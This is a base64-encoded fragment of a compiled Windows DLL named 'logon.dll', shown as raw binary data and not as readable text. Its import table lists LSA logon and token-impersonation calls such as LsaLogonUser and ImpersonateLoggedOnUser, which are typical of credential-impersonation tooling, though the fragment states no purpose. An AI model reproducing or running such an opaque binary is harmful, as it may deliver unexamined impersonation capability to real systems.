AAAAAAAAAAAAAAAAAAAAAABQcAEAAQAAAAAAAAD/////AAAAAEAAAACIRwEAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAeHABAAhIAQDgRwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAACBIAQAAAAAAAAAAAEBIAQC4RwEAkEYBAAAAAAAAAAAAAAAAAAAAAAAAAAAAeHABAAIAAAAAAAAA/////wAAAABAAAAACEgBAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAKBwAQCQSAEAaEgBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACoSAEAAAAAAAAAAADISAEAuEcBAJBGAQAAAAAAAAAAAAAAAAAAAAAAAAAAAKBwAQACAAAAAAAAAP////8AAAAAQAAAAJBIAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAADQcAEAGEkBAPBIAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAMEkBAAAAAAAAAAAAQEkBAAAAAAAAAAAAAAAAANBwAQAAAAAAAAAAAP////8AAAAAQAAAABhJAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAocAEAuEYBAGhJAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAHMBALhJAQCQSQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAANBJAQAAAAAAAAAAAOhJAQCQRgEAAAAAAAAAAAAAAAAAAAAAAABzAQABAAAAAAAAAP////8AAAAAQAAAALhJAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAABQSwEAAAAAAAAAAABAhAEAAAAAAAAAAAD/////AAAAAEAAAAAQSgEAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAaEoBAAAAAAAAAAAAYEsBALBKAQAoSgEAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABwhAEA4EsBAIhKAQAAAAAAAAAAAAAAAAAAAAAAcIQBAAEAAAAAAAAA/////wAAAABAAAAA4EsBAAAAAAAAAAAAAAAAANCDAQACAAAAAAAAAP////8AAAAAQAAAAIhLAQAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAABAhAEAEEoBAABLAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA0IMBAIhLAQAoSwEAAAAAAAAAAAAAAAAAAAAAAChKAQAAAAAAAAAAAAAAAAAIhAEAAgAAAAAAAAD/////AAAAAEAAAABQSgEAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAA+EsBAAAAAAAAAAAAAQAAAAAAAAAAAAAACIQBAFBKAQCgSwEAAAAAAAAAAAAAAAAAAAAAALBKAQAoSgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMhLAQAAAAAAAAAAANhKAQCwSgEAKEoBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAARGQoAGXQKABlkCQAZNAgAGTIV8BPgEcA0QwAAAQAAAForAAAgLAAA0McAAAAAAAABBgIABnICMAEPAQAPYgAAEQoCAAoyBjA0QwAAAQAAAC0uAABULgAA5McAAAAAAAAJGgYAGjQRABqSFuAUcBNgNEMAAAEAAABhLwAALTAAAArIAAAxMAAAAAAAAAEAAAABDQQADTQPAA2yBlABEggAElQJABI0CAASMg7gDHALYBkzCwAidL0AImS8ACI0uwAiAbYAFPAS4BBQAACwewAAoAUAAAkYAgAYshQwNEMAAAEAAAA/NQAAXzUAAFPIAABfNQAAAQYCAAZyAlABBgIABjICMAEdDAAddAsAHWQKAB1UCQAdNAgAHTIZ8BfgFcABFgoAFlQMABY0CwAWMhLwEOAOwAxwC2ABDwYAD2QMAA80CwAPcgtwARQIABRkDAAUVAsAFDQKABRyEHABCgQACjQGAAoyBnABFAYAFGQHABQ0BgAUMhBwAQkBAAliAAABBgIABhICMAEPBAAPNAYADzILcBEcCgAcZA8AHDQOABxyGPAW4BTQEsAQcDRDAAABAAAAD0AAACNBAACZyAAAAAAAAAEcDAAcZBAAHFQPABw0DgAcchjwFuAU0BLAEHAZLQsAG2RRABtUUAAbNE8AGwFKABTwEuAQcAAAsHsAAEACAAABCgIACjIGMAEAAAARBgIABlICMDRDAAABAAAATEkAAJRJAAC9yAAAAAAAAAEEAQAEYgAAGS8JAB50uwAeZLoAHjS5AB4BtgAQUAAAsHsAAKAFAAABFwgAF2QJABdUCAAXNAcAFzITcAEbCgAbdBAAG2QPABs0DgAbkhTwEuAQUAEAAAAREwQAEzQHABMyD3A0QwAAAgAAAGxUAACZVAAA1sgAAAAAAACrVAAA4lQAAO/IAAAAAAAAEQoEAAo0BgAKMgZwNEMAAAIAAABLVgAAVVYAANbIAAAAAAAAalYAAJFWAADvyAAAAAAAABEgDQAgxB8AIHQeACBkHQAgNBwAIAEYABnwF+AV0AAANEMAAAIAAACoVwAA21cAAAjJAAAAAAAA5FcAAHZaAAAIyQAAAAAAAAEPBgAPZAcADzQGAA8yC3ABDwYAD2QLAA80CgAPUgtwARQIABRkCgAUVAkAFDQIABRSEHABDQQADTQJAA0yBlABGQoAGXQNABlkDAAZVAsAGTQKABlyFeABCgQACjQNAApyBnABCAQACHIEcANgAjAZEwkAEwESAAzwCuAI0AbABHADYAIwAAA0QwAAAgAAANJzAAD3cwAAI8kAAPdzAADScwAAcnQAABfKAAAAAAAAAQcDAAdCA1ACMAAAGSIIACJSHvAc4BrQGMAWcBVgFDA0QwAAAgAAANN1AABqdgAArcoAAGp2AACbdQAAkXYAAMPKAAAAAAAAASELACE0HwAhARYAFfAT4BHQD8ANcAxgC1AAAAEXCgAXVBIAFzQQABeSE/AR4A/ADXAMYAkVCAAVdAgAFWQHABU0BgAVMhHgNEMAAAEAAABocAAA0nAAAAEAAADScAAAARkKABl0CQAZZAgAGVQHABk0BgAZMhXgARkKABk0FwAZ0hXwE+AR0A/ADXAMYAtQCQ0BAA1CAAA0QwAAAQAAALVmAADGZgAAlcoAAMhmAAABHAwAHGQMABxUCwAcNAoAHDIY8BbgFNASwBBwARgKABhkDgAYVA0AGDQMABhyFOASwBBwCRkKABl0DAAZZAsAGTQKABlSFfAT4BHQNEMAAAEAAACAcQAAx3IAAAEAAADLcgAACQQBAARCAAA0QwAAAQAAAIV7AACJewAAAQAAAIl7AAAJBAEABEIAADRDAAABAAAAZnsAAGp7AAABAAAAansAABEQBgAQdAcAEDQGABAyDOA0QwAAAQAAAOZ9AAAHfgAA7MoAAAAAAAAJCgQACjQGAAoyBnA0QwAAAQAAAP1+AAAwfwAAEMsAADB/AAAREQgAETQOABFSDfAL4AnAB3AGYDRDAAABAAAAFoEAAJ2BAAAwywAAAAAAABEKBAAKNAcACjIGcDRDAAABAAAAYoUAALmFAABOywAAAAAAABEZCgAZ5AsAGXQKABlkCQAZNAgAGVIV8DRDAAABAAAAM4cAAOqHAABOywAAAAAAABklCgAWVBEAFjQQABZyEvAQ4A7ADHALYLB7AAA4AAAAARQIABRkCAAUVAcAFDQGABQyEHAZKwcAGnS0ABo0swAaAbAAC1AAALB7AABwBQAAAAAAAAEHAgAHAZsAAQAAAAEAAAABAAAAGR4IAA+SC/AJ4AfABXAEYANQAjCwewAASAAAAAEQBgAQZA0AEDQMABCSDHABBAEABEIAABEVCAAVNAsAFTIR8A/gDcALcApgNEMAAAEAAADhlQAAE5YAAGfLAAAAAAAAGTYLACU0cQMlAWYDEPAO4AzQCsAIcAdgBlAAALB7AAAgGwAAERUIABU0CwAVMhHwD+ANwAtwCmA0QwAAAQAAAP2dAAAxngAAZ8sAAAAAAAAZMAsAHzRmAB8BXAAQ8A7gDNAKwAhwB2AGUAAAsHsAANgCAAABGAgAGGQIABhUBwAYNAYAGDIUcAEYCgAYZAoAGFQJABg0CAAYMhTwEuAQcBEGAgAGMgIwNEMAAAEAAADDrQAA2a0AAAnMAAAAAAAAARUGABVkEAAVNA4AFbIRcAEPBgAPZAsADzQKAA9yC3AAAAAAAQQBAARCAAABDwYAD2QRAA80EAAP0gtwGS0NRR90EgAbZBEAFzQQABNDDpIK8AjgBtAEwAJQAACwewAASAAAAAEPBgAPZA8ADzQOAA+yC3AZLQ01H3QQABtkDwAXNA4AEzMOcgrwCOAG0ATAAlAAALB7AAAwAAAAERkKABl0DAAZZAsAGTQKABlSFfAT4BHQNEMAAAIAAAAguAAAZLgAAH7LAAAAAAAA7bcAAH24AACmywAAAAAAAAEEAQAEEgAAEQ8GAA9kCQAPNAgAD1ILcDRDAAABAAAAKrkAAJy5AAC/ywAAAAAAAAEQBgAQdAcAEDQGABAyDOARFQgAFXQIABVkBwAVNAYAFTIR8DRDAAABAAAA+7kAABi6AADYywAAAAAAAAEGAgAGMgJQARkKABl0DwAZZA4AGVQNABk0DAAZkhXgAQ4CAA4yCjAREQYAETQKABEyDeALcApgNEMAAAEAAAAvwwAAc8MAACLMAAAAAAAAEQ8EAA80BwAPMgtwNEMAAAEAAABjxAAAbcQAAPHLAAAAAAAAAQQBAASCAAARBgIABjICcDRDAAABAAAAAcUAABfFAAAJzAAAAAAAABERBgARNAoAETIN4AtwCmA0QwAAAQAAAJPFAAC3xQAAIswAAAAAAAABAAAAGSEFABhiFOAScBFgEDAAACQ4AABgRQEA/////wAAAAD/////AAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAMAAAABAAAAjFYBAAIAAAACAAAAAwAAAAEAAACgVgEAQAAAAAAAAAAAAAAAQMwAADgAAABAAAAAAAAAAAAAAACDzAAASAAAAJAVAAD//////hUAAAAAAAAjFgAA/////0DMAAAAAAAATcwAAAEAAABVzAAAAgAAAHXMAAAAAAAAkcwAAAMAAAAZCgIACjIGUCQ4AABgRQEAGQsDAAtCB1AGMAAAJDgAAGBFAQABBgIABlICMAEKBAAKNAgAClIGcBkcBAANNBQADfIGcLB7AABwAAAAARAGABDkCQAQNAgAEDIM8CEmBAAmZAYABXQHADAgAABdIAAAQFcBACEAAgAAdAcAMCAAAF0gAABAVwEAIQAEAAB0BwAAZAYAMCAAAF0gAABAVwEAIQAAADAgAABdIAAAQFcBAAEPBgAPVAoADzQJAA9SC2AhBQIABXQIALAeAAA+HwAApFcBACEAAACwHgAAPh8AAKRXAQAhAAIAAHQIALAeAAA+HwAApFcBAAEPBgAPZAkADzQIAA9SC3AZHwUAEQEwAAXAA3ACUAAAsHsAAHABAAAhHQYAHfQ3ABXkNgAIZDUAoBYAAP4WAAD8VwEAIQgCAAg0NAD+FgAALBkAABRYAQAhAAAA/hYAACwZAAAUWAEAIQAAAKAWAAD+FgAA/FcBAAAAAAAAAAAAjCQAAAAAAACIWAEAAAAAAAAAAAAAAAAAAAAAAAIAAACgWAEAyFgBAAAAAAAAAAAAAAAAAAAAAAAAcAEAAAAAAP////8AAAAAGAAAAPwjAAAAAAAAAAAAAAAAAAAAAAAAKHABAAAAAAD/////AAAAABgAAAD4OAAAAAAAAAAAAAAAAAAAAAAAAFBwAQAAAAAA/////wAAAAAYAAAARCQAAAAAAAAAAAAAAAAAAAAAAACcJAAAAAAAADhZAQAAAAAAAAAAAAAAAAAAAAAAAwAAAFhZAQDwWAEAyFgBAAAAAAAAAAAAAAAAAAAAAAAAAAAAeHABAAAAAAD/////AAAAABgAAAAgJAAAAAAAAAAAAAAAAAAAAAAAAJwkAAAAAAAAoFkBAAAAAAAAAAAAAAAAAAAAAAADAAAAwFkBAPBYAQDIWAEAAAAAAAAAAAAAAAAAAAAAAAAAAACgcAEAAAAAAP////8AAAAAGAAAAGgkAAAAAAAAAAAAAAAAAAAAAAAAEGcAAAAAAAAIWgEAAAAAAAAAAAAAAAAAAAAAAAIAAAAgWgEAyFgBAAAAAAAAAAAAAAAAAAAAAAAAcwEAAAAAAP////8AAAAAGAAAAOxmAAAAAAAAAAAAAPBcAQAAAAAAAAAAAFhdAQBY0gAAwFoBAAAAAAAAAAAA0l0BACjQAACYWgEAAAAAAAAAAAA8XgEAANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxeAQAAAAAA+F0BAAAAAADgXQEAAAAAACJeAQAAAAAAAAAAAAAAAAByXQEAAAAAAH5dAQAAAAAAkl0BAAAAAABkXQEAAAAAALJdAQAAAAAAul0BAAAAAADGXQEAAAAAAJBiAQAAAAAAoGIBAAAAAACwYgEAAAAAAKJdAQAAAAAAPmABAAAAAABKXgEAAAAAAFpeAQAAAAAAal4BAAAAAAB8XgEAAAAAAJJeAQAAAAAApl4BAAAAAAC4XgEAAAAAANJeAQAAAAAA4F4BAAAAAAD0XgEAAAAAABBfAQAAAAAAHl8BAAAAAAA0XwEAAAAAAEZfAQAAAAAAXF8BAAAAAABoXwEAAAAAAHhfAQAAAAAAjl8BAAAAAACaXwEAAAAAAKZfAQAAAAAAtl8BAAAAAADIXwEAAAAAANZfAQAAAAAA/l8BAAAAAAAWYAEAAAAAAChgAQAAAAAAxGIBAAAAAABYYAEAAAAAAG5gAQAAAAAAiGABAAAAAACiYAEAAAAAALxgAQAAAAAA0mABAAAAAADmYAEAAAAAAPpgAQAAAAAAFmEBAAAAAAA0YQEAAAAAAEhhAQAAAAAAVGEBAAAAAABiYQEAAAAAAHBhAQAAAAAAemEBAAAAAACOYQEAAAAAAKZhAQAAAAAAvmEBAAAAAADQYQEAAAAAAOJhAQAAAAAA7GEBAAAAAAD4YQEAAAAAAARiAQAAAAAAEmIBAAAAAAAoYgEAAAAAADhiAQAAAAAASGIBAAAAAABYYgEAAAAAAGpiAQAAAAAAfmIBAAAAAAAAAAAAAAAAAEhdAQAAAAAAJl0BAAAAAAAQXQEAAAAAAAAAAAAAAAAAJgBMc2FDb25uZWN0VW50cnVzdGVkACwATHNhTG9va3VwQXV0aGVudGljYXRpb25QYWNrYWdlAAArAExzYUxvZ29uVXNlcgAAU2VjdXIzMi5kbGwA1gBDcmVhdGVGaWxlVwBcBFJlYWRGaWxlAAApAkdldEN1cnJlbnRQcm9jZXNzAHACR2V0TGFzdEVycm9yAADlAENyZWF0ZU11dGV4VwAAbgVTbGVlcAAxBmxzdHJsZW5XAAABBldyaXRlRmlsZQBLRVJORUwzMi5kbGwAANMBTHNhTnRTdGF0dXNUb1dpbkVycm9yABICT3BlblByb2Nlc3NUb2tlbgAAbwFHZXRUb2tlbkluZm9ybWF0aW9uAIkBSW1wZXJzb25hdGVMb2dnZWRPblVzZXIAQURWQVBJMzIuZGxsAABAAUVuY29kZVBvaW50ZXIAGAFEZWNvZGVQb2ludGVyAOgBR2V0Q29tbWFuZExpbmVBAC4CR2V0Q3VycmVudFRocmVhZElkAADEBFJ0bFBjVG9GaWxlSGVhZGVyAEwEUmFpc2VFeGNlcHRpb24AAMIEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAyARSdGxVbndpbmRFeACGA0lzRGVidWdnZXJQcmVzZW50AIsDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABzAUV4aXRQcm9jZXNzAIYCR2V0TW9kdWxlSGFuZGxlRXhXAAC8AkdldFByb2NBZGRyZXNzAADvA011bHRpQnl0ZVRvV2lkZUNoYXIAXwNIZWFwU2l6ZQAA5AJHZXRTdGRIYW5kbGUAAIMCR2V0TW9kdWxlRmlsZU5hbWVXAABaA0hlYXBGcmVlAABWA0hlYXBBbGxvYwAlBVNldExhc3RFcnJvcgAAwQJHZXRQcm9jZXNzSGVhcAAAXgJHZXRGaWxlVHlwZQBvA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAHwFEZWxldGVDcml0aWNhbFNlY3Rpb24A3gJHZXRTdGFydHVwSW5mb1cAggJHZXRNb2R1bGVGaWxlTmFtZUEAAD8EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAKgJHZXRDdXJyZW50UHJvY2Vzc0lkAPsCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUARwJHZXRFbnZpcm9ubWVudFN0cmluZ3NXAAC9AUZyZWVFbnZpcm9ubWVudFN0cmluZ3NXAO0FV2lkZUNoYXJUb011bHRpQnl0ZQC7BFJ0bENhcHR1cmVDb250ZXh0AMkEUnRsVmlydHVhbFVud2luZAAAoAVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAF8FU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAH4FVGVybWluYXRlUHJvY2VzcwAAkAVUbHNBbGxvYwAAkgVUbHNHZXRWYWx1ZQCTBVRsc1NldFZhbHVlAJEFVGxzRnJlZQCHAkdldE1vZHVsZUhhbmRsZVcAAEQBRW50ZXJDcml0aWNhbFNlY3Rpb24AAMADTGVhdmVDcml0aWNhbFNlY3Rpb24AAMUDTG9hZExpYnJhcnlFeFcAAJADSXNWYWxpZENvZGVQYWdlAMQBR2V0QUNQAACnAkdldE9FTUNQAADTAUdldENQSW5mbwBdA0hlYXBSZUFsbG9jABgET3V0cHV0RGVidWdTdHJpbmdXAADGA0xvYWRMaWJyYXJ5VwAAtANMQ01hcFN0cmluZ1cAAPwBR2V0Q29uc29sZUNQAAAOAkdldENvbnNvbGVNb2RlAAAYBVNldEZpbGVQb2ludGVyRXgAAOkCR2V0U3RyaW5nVHlwZVcAAD0FU2V0U3RkSGFuZGxlAAAABldyaXRlQ29uc29sZVcAswFGbHVzaEZpbGVCdWZmZXJzAACOAENsb3NlSGFuZGxlAAAAAAAAAAAAAAAAAAAAAAAAANdTiVIAAAAAEmMBAAEAAAABAAAAAQAAAAhjAQAMYwEAEGMBAKAWAAAcYwEAAABsb2dvbi5kbGwAVm9pZEZ1bmMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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SktMTU5PUFFSU1RVVldYWVoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADglwGAAQAAAAAAAAAAAAAA4JcBgAEAAAABAQAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDAAAAAAAAAAAAAAAAAAAATDYBgAEAAABQNgGAAQAAAFQ2AYABAAAAWDYBgAEAAABcNgGAAQAAAGA2AYABAAAAZDYBgAEAAABoNgGAAQAAAHA2AYABAAAAeDYBgAEAAACANgGAAQAAAJA2AYABAAAAnDYBgAEAAACoNgGAAQAAALQ2AYABAAAAuDYBgAEAAAC8NgGAAQAAAMA2AYABAAAAxDYBgAEAAADINgGAAQAAAMw2AYABAAAA0DYBgAEAAADUNgGAAQAAANg2AYABAAAA3DYBgAEAAADgNgGAAQAAAOg2AYABAAAA8DYBgAEAAAD8NgGAAQAAAAQ3AYABAAAAxDYBgAEAAAAMNwGAAQAAABQ3AYABAAAAHDcBgAEAAAAoNwGAAQAAADg3AYABAAAAQDcBgAEAAABQNwGAAQAAAFw3AYABAAAAYDcBgAEAAABoNwGAAQAAAHg3AYABAAAAkDcBgAEAAAABAAAAAAAAAKA3AYABAAAAqDcBgAEAAACwNwGAAQAAALg3AYABAAAAwDcBgAEAAADINwGAAQAAANA3AYABAAAA2DcBgAEAAADoNwGAAQAAAPg3AYABAAAACDgBgAEAAAAgOAGAAQAAADg4AYABAAAASDgBgAEAAABgOAGAAQAAAGg4AYABAAAAcDgBgAEAAAB4OAGAAQAAAIA4AYABAAAAiDgBgAEAAACQOAGAAQAAAJg4AYABAAAAoDgBgAEAAACoOAGAAQAAALA4AYABAAAAuDgBgAEAAADAOAGAAQAAANA4AYABAAAA6DgBgAEAAAD4OAGAAQAAAIA4AYABAAAACDkBgAEAAAAYOQGAAQAAACg5AYABAAAAODkBgAEAAABQOQGAAQAAAGA5AYABAAAAeDkBgAEAAACMOQGAAQAAAJQ5AYABAAAAoDkBgAEAAAC4OQGAAQAAAOA5AYABAAAAGPsAgAEAAACggQGAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAA